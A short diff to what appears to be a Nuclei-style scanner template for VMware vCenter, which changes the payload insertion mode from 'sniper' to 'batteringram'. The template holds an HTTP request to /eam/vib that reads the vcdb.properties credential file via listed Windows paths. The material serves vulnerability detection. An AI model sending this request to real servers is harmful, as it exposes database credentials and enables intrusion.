@@ -13,7 +13,7 @@ requests:
         - "C:\\ProgramData\\VMware\\VMware+VirtualCenter" # vCenter Server 5.5 and earlier (Windows 2008)
         - "C:\\Documents+and+Settings\\All+Users\\Application+Data\\VMware\\VMware+VirtualCenter" # Other Windows versions
         - "C:\\ProgramData\\VMware\\vCenterServer\\cfg\\vmware-vpx" # vCenter Server => 6.0
-    attack: sniper
+    attack: batteringram
     raw:
       - |
         GET /eam/vib?id=§path§\vcdb.properties HTTP/1.1
